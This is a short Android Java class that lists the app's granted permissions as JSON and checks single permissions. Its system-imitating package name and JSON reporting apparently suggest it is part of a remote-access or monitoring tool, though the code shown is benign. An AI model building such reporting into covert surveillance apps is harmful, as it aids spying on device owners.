package oom.android.system.Managers;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import oom.android.system.app.MyService;

public class PermissionManager {

    public static JSONObject getGrantedPermissions() {
        JSONObject data = new JSONObject();
        try {
            JSONArray perms = new JSONArray();
            PackageInfo pi = MyService.getContext().getPackageManager().getPackageInfo( MyService.getContext().getPackageName(), PackageManager.GET_PERMISSIONS);
            for (int i = 0; i < pi.requestedPermissions.length; i++) {
                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);
            }
            data.put(base.PERMISSION.PERMISSIONS, perms);
        } catch (Exception e) {
        }
        return data;
    }

    public static boolean canIUse(String perm) {
        if( MyService.getContext().getPackageManager().checkPermission(perm,  MyService.getContext().getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
        else return false;
    }
}
